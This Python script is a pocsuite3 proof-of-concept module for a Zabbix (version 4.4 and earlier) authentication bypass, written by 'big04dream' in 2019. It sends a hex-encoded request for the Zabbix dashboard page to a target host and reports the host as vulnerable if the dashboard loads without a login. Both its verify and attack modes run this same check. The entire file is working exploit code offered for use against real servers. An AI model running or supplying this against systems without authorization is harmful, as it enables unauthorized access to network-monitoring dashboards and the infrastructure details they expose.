#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase

class Zabbix(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-06'
    updateDate = '2019-11-06'
    references = ['']
    name = 'Zabbix <= 4.4 Authentication Bypass'
    appPowerLink = ''
    appName = 'Zabbix'
    appVersion = 'Zabbix <= 4.4'
    vulType = 'Authentication Bypass'
    desc = ''' 
    Zabbix <= 4.4 Authentication Bypass
    '''

    @property
    def _get_url(self):
        if self.url[-1] == '/':
            url = self.url
        else:
            url = self.url + '/'
        return url

    @property
    def _headers(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': self.url
        }
        return headers

    def _verify(self):
        result = {}
        payload = '\x2f\x7a\x61\x62\x62\x69\x78\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31'
        try:
            target = self._get_url + payload
            response = requests.get(
                url = target,
                headers = self._headers
            )
            if 'Dashboard' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Zabbix)